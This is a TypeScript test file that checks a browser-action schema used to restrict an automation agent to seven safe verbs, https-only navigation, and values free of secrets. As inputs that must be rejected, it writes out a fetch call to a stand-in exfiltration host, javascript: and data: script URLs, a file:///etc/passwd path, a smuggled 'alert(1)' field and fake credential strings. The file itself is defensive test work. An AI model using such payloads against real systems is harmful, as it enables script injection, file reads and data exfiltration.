import { describe, expect, it } from "vitest";
import {
  browserActionRequestSchema,
  browserActionResultSchema,
  browserActionSchema,
  browserTargetSchema,
  isBrowserWrite,
  type BrowserAction,
} from "../src/browser-action.js";

const ORIGIN = "https://acme.my.salesforce.com";
const TOKEN = "a".repeat(48);

function request(over: Record<string, unknown> = {}) {
  return {
    schema_version: 1,
    type: "browser_action_request",
    request_id: "018f0000-0000-7000-8000-000000000001",
    run_id: "018f0000-0000-7000-8000-000000000002",
    step_id: "step-1",
    action: { kind: "read_field", target: { role: "textbox", name: "Close date" } },
    authorization: TOKEN,
    allowed_origins: [ORIGIN],
    consequential: false,
    issued_at: "2026-08-05T11:59:30.000Z",
    expires_at: "2026-08-05T12:01:00.000Z",
    ...over,
  };
}

describe("the action set is closed", () => {
  it("accepts exactly the seven verbs", () => {
    const kinds = [
      { kind: "navigate", url: `${ORIGIN}/x` },
      { kind: "list_controls", roles: ["textbox"], limit: 40 },
      { kind: "read_field", target: { role: "textbox", name: "A" } },
      { kind: "focus_field", target: { role: "textbox", name: "A" } },
      { kind: "set_value", target: { role: "textbox", name: "A" }, value: "v" },
      { kind: "select_option", target: { role: "combobox", name: "A" }, option: "o" },
      { kind: "click_control", target: { role: "button", name: "A" }, confirm_name: "A" },
    ];
    for (const k of kinds) expect(browserActionSchema.safeParse(k).success).toBe(true);
    expect(browserActionSchema.options).toHaveLength(kinds.length);
  });

  it("gives list_controls no way to ask for everything, or for an unbounded page", () => {
    // The caller must say which roles it wants and how many it will accept.
    // An "all roles" or unlimited listing is how a shape read becomes a bulk
    // page read, so neither is representable.
    const bad = [
      { kind: "list_controls", roles: [], limit: 40 },
      { kind: "list_controls", roles: ["textbox"], limit: 0 },
      { kind: "list_controls", roles: ["textbox"], limit: 500 },
      { kind: "list_controls", roles: ["everything"], limit: 40 },
      { kind: "list_controls", roles: ["textbox"] },
      { kind: "list_controls", roles: ["textbox"], limit: 40, include_values: true },
    ];
    for (const a of bad) expect(browserActionSchema.safeParse(a).success).toBe(false);
  });

  it("has no script, eval, or selector escape hatch", () => {
    const attempts = [
      { kind: "eval", script: "fetch('https://exfil.test')" },
      { kind: "run_script", code: "1" },
      { kind: "click_control", selector: "button.save", confirm_name: "Save" },
      { kind: "dispatch_event", target: { role: "button", name: "A" }, event: "click" },
    ];
    for (const a of attempts) expect(browserActionSchema.safeParse(a).success).toBe(false);
  });

  it("rejects unknown keys on a known verb, so nothing rides along", () => {
    const smuggled = {
      kind: "set_value",
      target: { role: "textbox", name: "A" },
      value: "v",
      onComplete: "alert(1)",
    };
    expect(browserActionSchema.safeParse(smuggled).success).toBe(false);
  });

  it("classifies writes and reads", () => {
    const write: BrowserAction = {
      kind: "set_value",
      target: { role: "textbox", name: "A" },
      value: "v",
    };
    const read: BrowserAction = { kind: "read_field", target: { role: "textbox", name: "A" } };
    const nav: BrowserAction = { kind: "navigate", url: `${ORIGIN}/x` };
    expect(isBrowserWrite(write)).toBe(true);
    expect(isBrowserWrite(read)).toBe(false);
    expect(isBrowserWrite(nav)).toBe(false);
  });
});

describe("targets", () => {
  it("rejects a role the executor cannot address", () => {
    expect(browserTargetSchema.safeParse({ role: "iframe", name: "A" }).success).toBe(false);
  });

  it("rejects a secret-shaped name", () => {
    const parsed = browserTargetSchema.safeParse({ role: "textbox", name: "password: hunter2" });
    expect(parsed.success).toBe(false);
  });
});

describe("navigation is https-only", () => {
  it("rejects http, javascript:, data: and file:", () => {
    for (const url of [
      "http://acme.test/x",
      "javascript:alert(1)",
      "data:text/html,<script>1</script>",
      "file:///etc/passwd",
    ]) {
      expect(browserActionSchema.safeParse({ kind: "navigate", url }).success).toBe(false);
    }
  });
});

describe("requests", () => {
  it("accepts a well-formed request", () => {
    expect(browserActionRequestSchema.safeParse(request()).success).toBe(true);
  });

  it("rejects an authorization that is a real-looking credential", () => {
    const parsed = browserActionRequestSchema.safeParse(
      request({ authorization: `sk-ant-${"x".repeat(40)}` }),
    );
    expect(parsed.success).toBe(false);
  });

  it("rejects a token too short to be worth anything", () => {
    expect(browserActionRequestSchema.safeParse(request({ authorization: "short" })).success).toBe(
      false,
    );
  });

  it("requires at least one allowed origin, and only https ones", () => {
    expect(browserActionRequestSchema.safeParse(request({ allowed_origins: [] })).success).toBe(
      false,
    );
    expect(
      browserActionRequestSchema.safeParse(request({ allowed_origins: ["http://acme.test"] }))
        .success,
    ).toBe(false);
  });

  it("rejects a timestamp with an offset instead of Z", () => {
    expect(
      browserActionRequestSchema.safeParse(request({ issued_at: "2026-08-05T11:59:30+02:00" }))
        .success,
    ).toBe(false);
  });

  it("rejects a value carrying secret-shaped content", () => {
    const parsed = browserActionRequestSchema.safeParse(
      request({
        action: {
          kind: "set_value",
          target: { role: "textbox", name: "Notes" },
          value: "AKIAIOSFODNN7EXAMPLE",
        },
        consequential: true,
      }),
    );
    expect(parsed.success).toBe(false);
  });
});

describe("results", () => {
  const base = {
    schema_version: 1,
    type: "browser_action_result",
    request_id: "018f0000-0000-7000-8000-000000000001",
    run_id: "018f0000-0000-7000-8000-000000000002",
    step_id: "step-1",
    completed_at: "2026-08-05T12:00:01.000Z",
  };

  it("requires a reason for a refusal", () => {
    expect(browserActionResultSchema.safeParse({ ...base, outcome: "refused" }).success).toBe(
      false,
    );
    expect(
      browserActionResultSchema.safeParse({
        ...base,
        outcome: "refused",
        refusal_reason: "secure_field",
      }).success,
    ).toBe(true);
  });

  it("forbids a reason on a non-refusal, so an applied write cannot look declined", () => {
    expect(
      browserActionResultSchema.safeParse({
        ...base,
        outcome: "applied",
        refusal_reason: "secure_field",
      }).success,
    ).toBe(false);
  });

  it("rejects an unknown refusal reason", () => {
    expect(
      browserActionResultSchema.safeParse({
        ...base,
        outcome: "refused",
        refusal_reason: "because",
      }).success,
    ).toBe(false);
  });
});
